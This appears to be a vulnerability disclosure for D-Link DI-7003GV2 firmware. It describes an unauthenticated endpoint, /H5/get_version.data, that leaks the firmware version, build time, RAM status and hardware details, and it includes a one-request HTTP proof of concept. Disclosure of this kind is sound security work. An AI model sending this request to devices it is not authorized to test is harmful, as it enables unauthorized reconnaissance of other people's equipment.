# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 firmware version 24.04.18D1 R(68125) contains an information disclosure vulnerability in the `/H5/get_version.data` endpoint. This unauthenticated interface allows remote attackers to retrieve sensitive device information, including firmware version, build time, RAM status, and hardware configuration. 

# Vulnerability details

The processing function for the `H5/get_version.data` interface is `sub_48FE9C`

![图 0](img/07c856d6ed7b63a69d08a8514aca00ddf613c6ec82d1e57714947040301bfc83.png)  

`sub_48FE9C` function returns device name, version, and other information to the user.

![图 1](img/cdca093491135789e8193462ed8a4a2d938339815046af9f95daf312be4243f4.png)  


# Poc

```http
GET /H5/get_version.data HTTP/1.1
Host: 192.168.140.240
Content-Length: 0
Cache-Control: max-age=0
Origin: http://192.168.140.240
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.140.240/login.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
```

![图 2](img/e1460c2e6ed239e4210b00060accac944098385796adce26d4965981c122a773.png)  
